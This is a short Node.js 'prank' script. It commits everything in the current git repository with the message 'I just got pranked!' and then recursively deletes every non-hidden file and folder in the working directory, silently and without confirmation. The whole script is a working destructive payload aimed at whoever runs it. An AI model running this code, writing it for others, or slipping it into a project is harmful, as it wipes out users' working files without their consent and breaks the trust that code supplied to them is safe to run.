import { exec as temp_exec } from "child_process";
import util from "util";
import fs from "fs";
import path from "path";
const exec = util.promisify(temp_exec);

try {
  await exec("git add .");
  await exec(`git commit -m "I just got pranked!"`);
} catch (err) {}

fs.readdir(process.cwd(), (err, files) => {
  if (err) throw err;

  files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
  for (const file of files) {
    const path_string = path.join(process.cwd(), file);
    if (fs.lstatSync(path_string).isDirectory()) {
      fs.rm(path_string, { recursive: true }, (err) => {
        if (err) throw err;
      });
    } else {
      fs.unlink(path_string, (err) => {
        if (err) throw err;
      });
    }
  }
});
